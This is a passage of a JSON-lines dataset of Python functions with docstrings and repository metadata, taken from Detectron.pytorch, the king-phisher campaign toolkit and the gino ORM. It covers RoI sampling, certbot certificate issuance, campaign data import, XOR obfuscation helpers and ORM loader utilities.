roidb['max_classes'][keep_inds]\nsampled_labels[fg_rois_per_this_image:] = 0  # Label bg RoIs with class 0\nsampled_boxes = roidb['boxes'][keep_inds]\n\nif 'bbox_targets' not in roidb:\n    gt_inds = np.where(roidb['gt_classes'] > 0)[0]\n    gt_boxes = roidb['boxes'][gt_inds, :]\n    gt_assignments = gt_inds[roidb['box_to_gt_ind_map'][keep_inds]]\n    bbox_targets = _compute_targets(\n        sampled_boxes, gt_boxes[gt_assignments, :], sampled_labels)\n    bbox_targets, bbox_inside_weights = _expand_bbox_targets(bbox_targets)\nelse:\n    bbox_targets, bbox_inside_weights = _expand_bbox_targets(\n        roidb['bbox_targets'][keep_inds, :])\n\nbbox_outside_weights = np.array(\n    bbox_inside_weights > 0, dtype=bbox_inside_weights.dtype)\n\n# Scale rois and format as (batch_idx, x1, y1, x2, y2)\nsampled_rois = sampled_boxes * im_scale\nrepeated_batch_idx = batch_idx * blob_utils.ones((sampled_rois.shape[0], 1))\nsampled_rois = np.hstack((repeated_batch_idx, sampled_rois))\n\n# Base Fast R-CNN blobs\nblob_dict = dict(\n    labels_int32=sampled_labels.astype(np.int32, copy=False),\n    rois=sampled_rois,\n    bbox_targets=bbox_targets,\n    bbox_inside_weights=bbox_inside_weights,\n    bbox_outside_weights=bbox_outside_weights)\n\n# Optionally add Mask R-CNN blobs\nif cfg.MODEL.MASK_ON:\n    roi_data.mask_rcnn.add_mask_rcnn_blobs(blob_dict, sampled_boxes, roidb,\n                                           im_scale, batch_idx)\n\n# Optionally add Keypoint R-CNN blobs\nif cfg.MODEL.KEYPOINTS_ON:\n    roi_data.keypoint_rcnn.add_keypoint_rcnn_blobs(\n        blob_dict, roidb, fg_rois_per_image, fg_inds, im_scale, batch_idx)\n\nreturn blob_dict", "path": "Detectron.pytorch/lib/roi_data/fast_rcnn.py", "commit_date": "2018-05-20 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Compute the tight bounding box of a binary mask.\"\"\"\n", "func_signal": "def mask_to_bbox(mask):\n", "code": "xs = np.where(np.sum(mask, axis=0) > 0)[0]\nys = np.where(np.sum(mask, axis=1) > 0)[0]\n\nif len(xs) == 0 or len(ys) == 0:\n  return None\n\nx0 = xs[0]\nx1 = xs[-1]\ny0 = ys[0]\ny1 = ys[-1]\nreturn np.array((x0, y0, x1, y1), dtype=np.float32)", "path": "Detectron.pytorch/lib/utils/segms.py", "commit_date": "2018-03-28 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"By default training RoIs are added for a single feature map level only.\nWhen using FPN, the RoIs must be distributed over different FPN levels\naccording the level assignment heuristic (see: modeling.FPN.\nmap_rois_to_fpn_levels).\n\"\"\"\n", "func_signal": "def _add_multilevel_rois(blobs):\n", "code": "lvl_min = cfg.FPN.ROI_MIN_LEVEL\nlvl_max = cfg.FPN.ROI_MAX_LEVEL\n\ndef _distribute_rois_over_fpn_levels(rois_blob_name):\n    \"\"\"Distribute rois over the different FPN levels.\"\"\"\n    # Get target level for each roi\n    # Recall blob rois are in (batch_idx, x1, y1, x2, y2) format, hence take\n    # the box coordinates from columns 1:5\n    target_lvls = fpn_utils.map_rois_to_fpn_levels(\n        blobs[rois_blob_name][:, 1:5], lvl_min, lvl_max\n    )\n    # Add per FPN level roi blobs named like: <rois_blob_name>_fpn<lvl>\n    fpn_utils.add_multilevel_roi_blobs(\n        blobs, rois_blob_name, blobs[rois_blob_name], target_lvls, lvl_min,\n        lvl_max\n    )\n\n_distribute_rois_over_fpn_levels('rois')\nif cfg.MODEL.MASK_ON:\n    _distribute_rois_over_fpn_levels('mask_rois')\nif cfg.MODEL.KEYPOINTS_ON:\n    _distribute_rois_over_fpn_levels('keypoint_rois')", "path": "Detectron.pytorch/lib/roi_data/fast_rcnn.py", "commit_date": "2018-05-20 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"Convert a list of polygons into an array of tight bounding boxes.\"\"\"\n", "func_signal": "def polys_to_boxes(polys):\n", "code": "boxes_from_polys = np.zeros((len(polys), 4), dtype=np.float32)\nfor i in range(len(polys)):\n  poly = polys[i]\n  x0 = min(min(p[::2]) for p in poly)\n  x1 = max(max(p[::2]) for p in poly)\n  y0 = min(min(p[1::2]) for p in poly)\n  y1 = max(max(p[1::2]) for p in poly)\n  boxes_from_polys[i, :] = [x0, y0, x1, y1]\n\nreturn boxes_from_polys", "path": "Detectron.pytorch/lib/utils/segms.py", "commit_date": "2018-03-28 00:00:00", "repo_name": "roytseng-tw/Detectron.pytorch", "stars": 2816, "license": "mit", "language": "python", "size": 13683}
{"docstring": "\"\"\"\nIssue a certificate using Let's Encrypt's ``certbot`` utility. This function\nwraps the ``certbot`` binary and configures the parameters as appropriate.\nBy default, the resulting certificate will be placed under\n:py:data:`.LETS_ENCRYPT_DEFAULT_DATA_PATH`, however if *unified_directory*\nis used then it will be under ``$unified_directory/etc``.\n\n:param str webroot: The webroot to use while requesting the certificate.\n:param str hostname: The hostname of the certificate to request.\n:param str bin_path: The optional path to the ``certbot`` binary. If not\n\tspecified, then it will be searched for utilizing\n\t:py:func:`~king_phisher.startup.which`.\n:param str unified_directory: A single directory under which all the Let's\n\tEncrypt data should be stored. This is useful when not running the\n\tutility as root.\n:return: The exit status of the ``certbot`` utility.\n:rtype: int\n\"\"\"\n", "func_signal": "def certbot_issue(webroot, hostname, bin_path=None, unified_directory=None):\n", "code": "args = ['certonly']\nif unified_directory:\n\targs.extend(['--config-dir', os.path.join(unified_directory, 'etc')])\n\targs.extend(['--logs-dir', os.path.join(unified_directory, 'log')])\n\targs.extend(['--work-dir', os.path.join(unified_directory, 'lib')])\nargs.extend(['--webroot', '--webroot-path', webroot, '-d', hostname])\nproc = _run_certbot(args, bin_path=bin_path)\nreturn proc.status", "path": "king-phisher/king_phisher/server/letsencrypt.py", "commit_date": "2019-09-03 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nChecks to make sure the import campaign thread is closed before\nclosing the window.\n\"\"\"\n", "func_signal": "def signal_window_delete_event(self, _, event):\n", "code": "if not self.campaign_info:\n\treturn False\nif not self.thread_import_campaign:\n\treturn False\nif not self.thread_import_campaign.is_alive():\n\treturn False\nresponse = gui_utilities.show_dialog_yes_no(\n\t'Cancel Importing?',\n\tself.window,\n\t'Do you want to cancel importing the campaign?'\n)\nif not response:\n\treturn True\n\nself.thread_import_campaign.stop()\nself.thread_import_campaign.join()\nself._import_cleanup(remove_campaign=True)", "path": "king-phisher/king_phisher/client/windows/campaign_import.py", "commit_date": "2017-05-16 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nUsed by the import thread to import the campaign into the database.\nThrough this process after every major action, the thread will check\nto see if it has been requested to stop.\n\"\"\"\n", "func_signal": "def _import_campaign(self):\n", "code": "self.logger.debug(\"import campaign running in tid: 0x{0:x}\".format(threading.current_thread().ident))\nif not self.campaign_info:\n\treturn\n# prevent user from changing campaign info during import\nstart_time = datetime.datetime.now()\nGLib.idle_add(self.button_import_campaign.set_sensitive, False)\nGLib.idle_add(self.button_select.set_sensitive, False)\nGLib.idle_add(self.spinner.start)\n\nbatch_size = 100\nif self.thread_import_campaign.stopped():\n\treturn\nself.preprep_xml_data()\n\nself.campaign_info.find('id').text = self.rpc(\n\t'campaign/new',\n\tself.campaign_info.find('name').text,\n\tself.campaign_info.find('description').text\n)\nself.logger.info(\"created new campaign id: {}\".format(self.campaign_info.find('id').text))\n\nnodes_completed = 0\nnode_count = float(len(self.campaign_info.findall('.//*')))\nif self.thread_import_campaign.stopped():\n\treturn\nfor nods in self.campaign_info.getiterator():\n\tif nods.tag == 'campaign_id':\n\t\tnods.text = self.campaign_info.find('id').text\nself._update_text_view(\"Campaign created, ID set to {}\".format(self.campaign_info.find('id').text), idle=True)\n\nkeys = []\nvalues = []\nif self.thread_import_campaign.stopped():\n\treturn\nfor elements in self.campaign_info:\n\tif elements.tag in ('id', 'landing_pages', 'messages', 'visits', 'credentials', 'deaddrop_deployments', 'deaddrop_connections'):\n\t\tcontinue\n\tkeys.append(elements.tag)\n\tvalues.append(elements.text)\n\nself.rpc('db/table/set', 'campaigns', int(self.campaign_info.find('id').text), tuple(keys), tuple(values))\nnodes_completed += float(len(values) + 1)\npercentage_completed = nodes_completed / node_count\nGLib.idle_add(self.import_progress.set_fraction, percentage_completed)\nif self.thread_import_campaign.stopped():\n\treturn\n\nfor tables in ('landing_pages', 'messages', 'visits', 'credentials', 'deaddrop_deployments', 'deaddrop_connections'):\n\tinserted_ids = []\n\tif self.thread_import_campaign.stopped():\n\t\treturn\n\tself._update_text_view(\"Serializing table {} data for import\".format(tables), idle=True)\n\tkeys, rows = self._get_keys_values(self.campaign_info.find(tables))\n\tself._update_text_view(\"Working on table {} adding {} rows\".format(tables, len(rows)), idle=True)\n\tif self.thread_import_campaign.stopped():\n\t\treturn\n\n\t# make table rows easy to manage for updating new ids returned\n\ttable_rows = []\n\tfor row in rows:\n\t\trow = dict(zip(keys, row))\n\t\ttable_rows.append(row)\n\n\twhile rows and not self.thread_import_campaign.stopped():\n\t\ttry:\n\t\t\tinserted_ids = inserted_ids + self.rpc('/db/table/insert/multi', tables, keys, rows[:batch_size], deconflict_ids=True)\n\t\texcept advancedhttpserver.RPCError:\n\t\t\tresponse = gui_utilities.glib_idle_add_wait(self.failed_import_action)\n\t\t\tself._import_cleanup(remove_campaign=response)\n\t\t\tfailed_string = 'Failed to import campaign, all partial campaign data ' + ('has been removed' if response else 'was left in place')\n\t\t\tself.logger.warning(failed_string.lower())\n\t\t\tself._update_text_view(failed_string, idle=True)\n\t\t\treturn\n\n\t\trows = rows[batch_size:]\n\t\tnodes_completed += float(batch_size * len(keys))\n\t\tpercentage_completed = nodes_completed / node_count\n\t\tGLib.idle_add(self.import_progress.set_fraction, percentage_completed)\n\n\tif self.thread_import_campaign.stopped():\n\t\treturn\n\n\t# update id fields to maintain relationships\n\tself._update_text_view(\"Updating dependencies for table: {}\".format(tables), idle=True)\n\tfor id_ in inserted_ids:\n\t\tif id_ != table_rows[inserted_ids.index(id_)]['id']:\n\t\t\tself._update_id(\n\t\t\t\tself.campaign_info, ['id', \"{}_id\".format(tables[:-1])],\n\t\t\t\ttable_rows[inserted_ids.index(id_)]['id'], id_\n\t\t\t)\n\nGLib.idle_add(self.import_progress.set_fraction, 1.0)\nself._import_cleanup()\ndone_string = \"Done importing campaign. Importing the campaign took {}\".format(datetime.datetime.now() - start_time)\nself._update_text_view(done_string, idle=True)\nself.logger.info(done_string.lower())", "path": "king-phisher/king_phisher/client/windows/campaign_import.py", "commit_date": "2017-05-16 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nEncode data using the XOR algorithm. This is not suitable for encryption\npurposes and should only be used for light obfuscation. The key is\nprepended to the data as the first byte which is required to be decoded\npy the :py:func:`.xor_decode` function.\n\n:param bytes data: The data to encode.\n:param int seed_key: The optional value to use as the for XOR key.\n:return: The encoded data.\n:rtype: bytes\n\"\"\"\n", "func_signal": "def xor_encode(data, seed_key=None, encoding='utf-8'):\n", "code": "if isinstance(data, str):\n\tdata = data.encode(encoding)\nif seed_key is None:\n\tseed_key = random.randint(0, 255)\nelse:\n\tseed_key &= 0xff\nencoded_data = collections.deque([seed_key])\nlast_key = seed_key\nfor byte in data:\n\te_byte = (byte ^ last_key)\n\tlast_key = e_byte\n\tencoded_data.append(e_byte)\nreturn bytes(encoded_data)", "path": "king-phisher/king_phisher/xor.py", "commit_date": "2019-08-26 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nUsed to delete the imported campaign on failure or early exit of the\nimport window, if the user selects to have it removed.\n\"\"\"\n", "func_signal": "def remove_import_campaign(self):\n", "code": "campaign_id = self.campaign_info.find('id').text\ncampaign_name = self.campaign_info.find('name').text\ncampaign_check = self.rpc('db/table/get', 'campaigns', campaign_id)\nif not campaign_check:\n\treturn\nif campaign_name == campaign_check['name']:\n\tself.rpc('db/table/delete', 'campaigns', campaign_id)\n\tself.logger.info(\"deleted campaign {}\".format(campaign_id))", "path": "king-phisher/king_phisher/client/windows/campaign_import.py", "commit_date": "2017-05-16 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"Iterate over the names and values in a group of constants.\"\"\"\n", "func_signal": "def items(cls):\n", "code": "for name in dir(cls):\n\tif name.upper() != name:\n\t\tcontinue\n\tyield (name, getattr(cls, name))", "path": "king-phisher/king_phisher/constants.py", "commit_date": "2019-04-04 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nThis function provides the actions required to see if required IDs are\nalready in the database. If they are not it will clear them out and set\nsubelement.attrib['type'] to null. If the element is required it will\nset it to a default value. This will normalize the data and ready it for\nimport into the database.\n\"\"\"\n", "func_signal": "def preprep_xml_data(self):\n", "code": "self._set_text_view('Normalizing Campaign Data')\nself.campaign_info.find('name').text = self.entry_campaign_name.get_text()\n\ncampaign_type_check = self.rpc('db/table/get', 'campaign_types', self.campaign_info.find('campaign_type_id').text)\nif not campaign_type_check:\n\ttemp_string = 'Campaign type not found, removing'\n\tself.logger.info(temp_string.lower())\n\tself._update_text_view(temp_string, idle=True)\n\treset_node = self.campaign_info.find('campaign_type_id')\n\treset_node.clear()\n\treset_node.attrib['type'] = 'null'\n\nif self.campaign_info.find('user_id').text != self.config['server_username']:\n\ttemp_string = 'Setting the campaign owner to the current user'\n\tself.logger.info(temp_string.lower())\n\tself._update_text_view(temp_string, idle=True)\n\tself.campaign_info.find('user_id').text = self.config['server_username']\n\ncompany_id_check = self.rpc('db/table/get', 'companies', int(self.campaign_info.find('company_id').text))\nif not company_id_check:\n\ttemp_string = 'Company id not found, removing'\n\tself.logger.info(temp_string.lower())\n\tself._update_text_view(temp_string, idle=True)\n\treset_node = self.campaign_info.find('company_id')\n\treset_node.clear()\n\treset_node.attrib['type'] = 'null'\n\nfor message in self.campaign_info.find('messages').getiterator():\n\tif message.tag != 'company_department_id':\n\t\tcontinue\n\tif not message.text:\n\t\tcontinue\n\tself.logger.info(\"checking company_department_id {}\".format(message.text))\n\tcompany_department_id_check = self.rpc('db/table/get', 'company_departments', message.text)\n\tif not company_department_id_check:\n\t\ttemp_string = \"Company department id {} not found, removing it from campaign\".format(message.text)\n\t\tself.logger.info(temp_string.lower())\n\t\tself._update_text_view(temp_string, idle=True)\n\t\tself._update_id(self.campaign_info, ['company_department_id'], message.text, None)", "path": "king-phisher/king_phisher/client/windows/campaign_import.py", "commit_date": "2017-05-16 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nRetrieve all the hostnames for which a valid SNI configuration can be\nretrieved. These are the hostnames for which SNI can be enabled. If\n*check_files* is enabled, the data files will be checked to ensure that they\nexist and are readable, else the configuration will be omitted.\n\n:param config: Configuration to retrieve settings from.\n:type config: :py:class:`smoke_zephyr.configuration.Configuration`\n:param bool check_files: Whether or not to check the referenced data files.\n:return: A dictionary, keyed by hostnames with values of :py:class:`.SNIHostnameConfiguration` instances.\n:rtype: dict\n\"\"\"\n", "func_signal": "def get_sni_hostnames(config=None, check_files=True):\n", "code": "unified_directory = config.get_if_exists('server.letsencrypt.data_path') if config else None\nif unified_directory:\n\t_sync_hostnames(unified_directory)\nhostnames = collections.OrderedDict()\nfor hostname, sni_config in _sni_hostnames.items():\n\tif check_files and not _check_files(sni_config['certfile'], sni_config['keyfile']):\n\t\tcontinue\n\thostnames[hostname] = SNIHostnameConfiguration(**sni_config)\nreturn hostnames", "path": "king-phisher/king_phisher/server/letsencrypt.py", "commit_date": "2019-09-03 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nDecode data using the XOR algorithm. This is not suitable for encryption\npurposes and should only be used for light obfuscation. This function\nrequires the key to be set as the first byte of *data* as done in the\n:py:func:`.xor_encode` function.\n\n:param str data: The data to decode.\n:return: The decoded data.\n:rtype: str\n\"\"\"\n", "func_signal": "def xor_decode(data, encoding='utf-8'):\n", "code": "if isinstance(data, str):\n\tdata = data.encode(encoding)\ndata = collections.deque(data)\nlast_key = data.popleft()\ndecoded_data = collections.deque()\nfor b in data:\n\td = (b ^ last_key)\n\tlast_key = b\n\tdecoded_data.append(d)\nreturn bytes(decoded_data)", "path": "king-phisher/king_phisher/xor.py", "commit_date": "2019-08-26 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nThis will check to see if the campaign information is present. If\ncampaign information is present it will launch an py:class:`ImportThread`\nto import the campaign in the background, freeing up the GUI for the\nuser to conduct other functions.\n\"\"\"\n", "func_signal": "def signal_import_button(self, _):\n", "code": "if not self.campaign_info:\n\tself._update_text_view('No campaign information to import')\n\tself.button_import_campaign.set_sensitive(False)\n\treturn\nself.thread_import_campaign = ImportThread(target=self._import_campaign)\nself.thread_import_campaign.start()", "path": "king-phisher/king_phisher/client/windows/campaign_import.py", "commit_date": "2017-05-16 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nA decorator to \"export\" a function by placing it in :py:data:`.functions`.\n\n:param function: The function to export.\n:type function: function\n\"\"\"\n", "func_signal": "def export_function(function):\n", "code": "functions[function.__name__] = function\nreturn function", "path": "king-phisher/king_phisher/server/template_extras.py", "commit_date": "2018-11-30 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"Iterate over the names in a group of constants.\"\"\"\n", "func_signal": "def names(cls):\n", "code": "for name in dir(cls):\n\tif name.upper() != name:\n\t\tcontinue\n\tyield name", "path": "king-phisher/king_phisher/constants.py", "commit_date": "2019-04-04 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nA function for decorating REST API handlers. The function checks the API\ntoken in the request and encodes the handler response in JSON to be sent to\nthe client.\n\n:param handle_function: The REST API handler.\n\"\"\"\n", "func_signal": "def rest_handler(handle_function):\n", "code": "def wrapped(handler, params):\n\tclient_ip = ipaddress.ip_address(handler.client_address[0])\n\tconfig = handler.config\n\tif not config.get('server.rest_api.enabled'):\n\t\tlogger.warning(\"denying REST API request from {0} (REST API is disabled)\".format(client_ip))\n\t\thandler.respond_unauthorized()\n\t\treturn\n\tnetworks = config.get_if_exists('server.rest_api.networks')\n\tif networks is not None:\n\t\tfound = False\n\t\tfor network in networks:\n\t\t\tif client_ip in ipaddress.ip_network(network, strict=False):\n\t\t\t\tfound = True\n\t\t\t\tbreak\n\t\tif not found:\n\t\t\tlogger.warning(\"denying REST API request from {0} (origin is from an unauthorized network)\".format(client_ip))\n\t\t\thandler.respond_unauthorized()\n\t\t\treturn\n\tif not handler.config.get('server.rest_api.token'):\n\t\tlogger.warning(\"denying REST API request from {0} (configured token is invalid)\".format(client_ip))\n\t\thandler.respond_unauthorized()\n\t\treturn\n\tif config.get('server.rest_api.token') != handler.get_query('token'):\n\t\tlogger.warning(\"denying REST API request from {0} (invalid authentication token)\".format(client_ip))\n\t\thandler.respond_unauthorized()\n\t\treturn\n\tresponse = dict(result=handle_function(handler, params))\n\tresponse = json.dumps(response, sort_keys=True, indent=2, separators=(',', ': '))\n\tresponse = response.encode('utf-8')\n\thandler.send_response(200)\n\thandler.send_header('Content-Type', 'application/json')\n\thandler.send_header('Content-Length', str(len(response)))\n\thandler.end_headers()\n\thandler.wfile.write(response)\n\treturn\nreturn wrapped", "path": "king-phisher/king_phisher/server/rest_api.py", "commit_date": "2017-09-27 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nWill check to see if the provided campaign name is safe to use.\n\n:param str campaign_name: campaign name to check\n:param bool verbose: If true will update output to text buffer.\n:return: True if campaign name can be used\n:rtype: bool\n\"\"\"\n", "func_signal": "def _check_campaign_name(self, campaign_name, verbose=False):\n", "code": "if not self.campaign_info or not self.db_campaigns:\n\treturn False\n\nif next((nodes for nodes in self.db_campaigns if nodes['node']['name'] == campaign_name), None):\n\tif verbose:\n\t\tself._update_text_view(\"Campaign name {} is already in use by another campaign.\".format(campaign_name), idle=True)\n\treturn False\n\nif verbose:\n\tself._update_text_view(\"Campaign Name {} is not in use, ready to import\".format(campaign_name), idle=True)\nreturn True", "path": "king-phisher/king_phisher/client/windows/campaign_import.py", "commit_date": "2017-05-16 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"Iterate over the values in a group of constants.\"\"\"\n", "func_signal": "def values(cls):\n", "code": "for name in dir(cls):\n\tif name.upper() != name:\n\t\tcontinue\n\tyield getattr(cls, name)", "path": "king-phisher/king_phisher/constants.py", "commit_date": "2019-04-04 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nIterates through the element and replaces the specified old ID with the\nnew ID in the requested ID fields.\n\n:param element: Element to iterate over where the old id values can be found.\n:type element: :py:class:`xml.etree.ElementTree.Element`\n:param list id_fields: The list of fields to look for old_id.\n:param old_id: The old id value that has been changed\n:param new_id: The new id value to set.\n\"\"\"\n", "func_signal": "def _update_id(self, element, id_fields, old_id, new_id):\n", "code": "for nods in element.iter():\n\tif nods.tag in id_fields and nods.text == old_id:\n\t\tnods.text = new_id\n\t\t# if new_id is none set type to null\n\t\tif new_id is None:\n\t\t\tnods.attrib['type'] = 'null'", "path": "king-phisher/king_phisher/client/windows/campaign_import.py", "commit_date": "2017-05-16 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nWhen there is a change in the campaign entry field it will check to see\nif the name is already in use. If it is not in use it will change the\nsensitivity of the :py:attr:`.button_import_campaign` to allow the user\nto start the import process.\n\"\"\"\n", "func_signal": "def signal_entry_change(self, _):\n", "code": "if not self.campaign_info:\n\treturn\nif not self._check_campaign_name(self.entry_campaign_name.get_text()):\n\tself.button_import_campaign.set_sensitive(False)\n\treturn\nself.button_import_campaign.set_sensitive(True)\nreturn", "path": "king-phisher/king_phisher/client/windows/campaign_import.py", "commit_date": "2017-05-16 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nSearch for and return the SNI configuration for the specified *hostname*.\nThis method will first check to see if the entry exists in the database\nbefore searching the Let's Encrypt data directory (if ``data_path`` is\npresent in the server configuration). If no configuration data is found, or\nthe data file paths appear invalid, ``None`` is returned.\n\n:param str hostname: The hostname to retrieve the configuration for.\n:param config: Configuration to retrieve settings from.\n:type config: :py:class:`smoke_zephyr.configuration.Configuration`\n:return: The SNI configuration for the hostname if it was found.\n:rtype: :py:class:`.SNIHostnameConfiguration`\n\"\"\"\n", "func_signal": "def get_sni_hostname_config(hostname, config=None):\n", "code": "unified_directory = config.get_if_exists('server.letsencrypt.data_path') if config else None\nif unified_directory:\n\t_sync_hostnames(unified_directory)\n\nsni_config = _sni_hostnames.get(hostname)\nif not sni_config:\n\treturn None\nif not _check_files(sni_config['certfile'], sni_config['keyfile']):\n\treturn None\nreturn SNIHostnameConfiguration(**sni_config)", "path": "king-phisher/king_phisher/server/letsencrypt.py", "commit_date": "2019-09-03 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nGet the path to Let's Encrypt's ``certbot`` command line utility. If the\npath is found, it is verified to be both a file and executable. If the\npath verification fails, ``None`` is returned.\n\n.. versionadded:: 1.14.0\n\n:param config: Configuration to retrieve settings from.\n:type config: :py:class:`smoke_zephyr.configuration.Configuration`\n:return: The path to the certbot binary.\n:rtype: str\n\"\"\"\n", "func_signal": "def get_certbot_bin_path(config=None):\n", "code": "if config:\n\tletsencrypt_config = config.get_if_exists('server.letsencrypt', {})\nelse:\n\tletsencrypt_config = {}\nbin_path = letsencrypt_config.get('certbot_path') or startup.which('certbot')\nif bin_path is None:\n\treturn None\nif not os.path.isfile(bin_path):\n\treturn None\nif not os.access(bin_path, os.R_OK | os.X_OK):\n\treturn None\nreturn bin_path", "path": "king-phisher/king_phisher/server/letsencrypt.py", "commit_date": "2019-09-03 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"\nA Jinja function to embed a video into a web page using YouTube's\n`iframe API <https://developers.google.com/youtube/iframe_api_reference>`_.\nIn order to enable a training button after the video has ended the\nyoutube.js file needs to be included and *enable_js* just be set to True. If\n*start* or *end* are specified as strings, the must be in a format suitable\nto be parsed by :py:func:`~smoke_zephyr.utilities.parse_timespan`.\n\n:param str video_id: The id of the YouTube video to embed.\n:param bool autoplay: Start playing the video as soon as the page loads.\n:param bool enable_js: Enable the Javascript API.\n:param start: The time offset at which the video should begin playing.\n:type start: int, str\n:param end: The time offset at which the video should stop playing.\n:type end: int, str\n\"\"\"\n", "func_signal": "def embed_youtube_video(video_id, autoplay=True, enable_js=False, start=0, end=None):\n", "code": "autoplay = int(autoplay)\nyt_url = \"https://www.youtube.com/embed/{0}?autoplay={1}&modestbranding=1&rel=0&showinfo=0\".format(video_id, autoplay)\nif enable_js:\n\tyt_url += '&enablejsapi=1'\nif start:\n\tif isinstance(start, str):\n\t\tstart = smoke_zephyr.utilities.parse_timespan(start)\n\tyt_url += \"&start={0}\".format(start)\nif end:\n\tif isinstance(end, str):\n\t\tend = smoke_zephyr.utilities.parse_timespan(end)\n\tyt_url += \"&end={0}\".format(end)\niframe_tag = \"<iframe id=\\\"ytplayer\\\" type=\\\"text/html\\\" width=\\\"720\\\" height=\\\"405\\\" src=\\\"{0}\\\" frameborder=\\\"0\\\" allowfullscreen></iframe>\".format(yt_url)\nreturn markupsafe.Markup(iframe_tag)", "path": "king-phisher/king_phisher/server/template_extras.py", "commit_date": "2018-11-30 00:00:00", "repo_name": "rsmusllp/king-phisher", "stars": 2125, "license": "bsd-3-clause", "language": "python", "size": 7126}
{"docstring": "\"\"\"Deprecated method for compatibility, does nothing.\"\"\"\n", "func_signal": "def none_as_none(self, enabled=True):\n", "code": "if not enabled:\n    warnings.warn(\n        \"Disabling none_as_none is not supported.\",\n        DeprecationWarning,\n    )\nreturn self", "path": "gino/src/gino/loader.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"Update the loader with new rules.\n\nAfter initialization, the rules of this loader can still be updated. This is\nuseful when using the model class as a shortcut of :class:`~ModelLoader` where\npossible, chaining with a :meth:`~load` to initialize the rules, for example::\n\n    sqlalchemy.select(\n        [user.outerjoin(Company)]\n    ).execution_options(\n        loader=ModelLoader(User, company=Company.load('name'))\n    )\n\n:param columns: If provided, replace the columns to load with the given ones.\n:param extras: Update the loader with new extras.\n:return: ``self`` for chaining.\n\"\"\"\n\n", "func_signal": "def load(self, *columns, **extras):\n", "code": "if columns:\n    self.columns = [_get_column(self.model, name) for name in columns]\n\nself.extras.update((key, self.get(value)) for key, value in extras.items())\nreturn self", "path": "gino/src/gino/loader.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "# noinspection PyProtectedMember\n", "func_signal": "def __get__(self, instance, owner):\n", "code": "owner._check_abstract()\nq = sa.select([owner.__table__])\nif instance is not None:\n    q = q.where(instance.lookup())\nreturn q.execution_options(model=weakref.ref(owner))", "path": "gino/src/gino/crud.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
{"docstring": "\"\"\"\nConvenient method to generate a dict from this model instance.\n\nKeys will be attribute names, while values are loaded from memory (not\nfrom database). If there are :class:`~gino.json_support.JSONProperty`\nattributes in this model, their source JSON field will not be included\nin the returning dict - instead the JSON attributes will be.\n\n.. seealso::\n\n    :mod:`.json_support`\n\n\"\"\"\n", "func_signal": "def to_dict(self):\n", "code": "cls = type(self)\n# noinspection PyTypeChecker\nkeys = set(cls._column_name_map.invert_get(c.name) for c in cls)\nfor key, prop in cls.__dict__.items():\n    if isinstance(prop, json_support.JSONProperty):\n        keys.add(key)\n        keys.discard(prop.prop_name)\nreturn dict((k, getattr(self, k)) for k in keys)", "path": "gino/src/gino/crud.py", "commit_date": "2020-12-11 00:00:00", "repo_name": "python-gino/gino", "stars": 2640, "license": "other", "language": "python", "size": 2744}
